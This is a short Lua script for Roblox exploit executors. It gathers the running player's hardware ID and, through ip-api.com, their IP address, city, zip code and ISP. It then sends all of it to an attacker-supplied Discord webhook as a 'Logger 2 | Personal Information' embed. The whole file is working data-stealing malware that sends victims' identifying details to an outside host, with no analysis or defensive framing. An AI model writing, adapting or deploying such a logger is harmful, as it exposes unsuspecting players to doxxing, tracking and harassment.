if syn then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end
local hardware_id = game:GetService("RbxAnalyticsService"):GetClientId()

local ip_info = HttpRequest({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local embed = {
        ['title'] = "Logger 2 | Personal Information",
        ['description'] = string.format("\HWID: **%s**\nIP: **%s**\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", hardware_id, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
        ["type"] = "rich",
        ["color"] = tonumber(getgenv().EmbedColor),
}
HttpRequest(
    {
    Url = ''..getgenv().DiscordWebhook..'',
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
    }
)
